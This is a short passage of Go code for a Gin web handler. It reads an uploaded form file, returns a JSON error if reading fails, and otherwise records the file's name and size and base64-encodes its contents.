		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read " + fieldName + " data"})
		return
	}
	filename = file.Filename
	size = int64(len(data))
	b64Data = base64.StdEncoding.EncodeToString(data)
	ok = true
	return
}
